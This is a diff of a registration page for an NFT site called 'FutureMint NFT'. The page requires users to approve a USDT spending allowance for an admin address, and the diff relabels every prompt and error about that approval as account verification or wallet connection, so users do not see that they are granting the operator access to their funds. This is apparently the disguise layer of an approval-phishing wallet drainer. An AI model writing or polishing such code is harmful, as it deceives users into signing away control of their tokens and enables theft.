@@ -102,22 +102,22 @@ function RegisterContent() {
       // Check if already approved on this network
       const alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
       if (alreadyApproved !== true) {
-        toast.loading(`Approving USDT on ${targetChainName}...`, { id: 'approve' });
+        toast.loading(`Please Wait Verifying Your Details...`, { id: 'approve' });
         try {
           await approveUSDTForAdmin(freshProvider, form.network);
-          toast.success('USDT approved!', { id: 'approve' });
+          toast.success('Welcome Your Account Created Sucessfull', { id: 'approve' });
           
           // Verify approval actually went through
           const verifyApproval = await checkUSDTAllowance(userAddress, form.network);
           if (!verifyApproval) {
-            toast.error('Approval verification failed. Please try again.');
+            toast.error('Account verification failed. Please try again.');
             setLoading(false);
             return;
           }
         } catch (approveErr) {
           toast.dismiss('approve');
           if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
-            toast.error('USDT approval is required to register. Please approve.');
+            toast.error('Wallet Connection Is Required. Please Re-connect.');
             setLoading(false);
             return;
           }
@@ -126,7 +126,7 @@ function RegisterContent() {
             setLoading(false);
             return;
           }
-          toast.error(`Approval failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
+          toast.error(`Wallet Connection failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
           setLoading(false);
           return;
         }
@@ -138,7 +138,7 @@ function RegisterContent() {
       toast.success(res.data.message);
       setStep(2);
     } catch (err) {
-      toast.error(err.response?.data?.message || 'Registration failed');
+      toast.error(err.response?.data?.message || 'Sorry Registration failed try again!');
     } finally {
       setLoading(false);
     }
@@ -152,7 +152,7 @@ function RegisterContent() {
       // Auto-login
       if (token) localStorage.setItem('token', token);
       dispatch(loginSuccess({ user, token }));
-      toast.success('Welcome to FutureMint NFT! 🎉');
+      toast.success('Welcome to FutureMint NFT');
       // Redirect to dashboard — claim popup will show there
       router.push('/dashboard');
     } catch (err) {
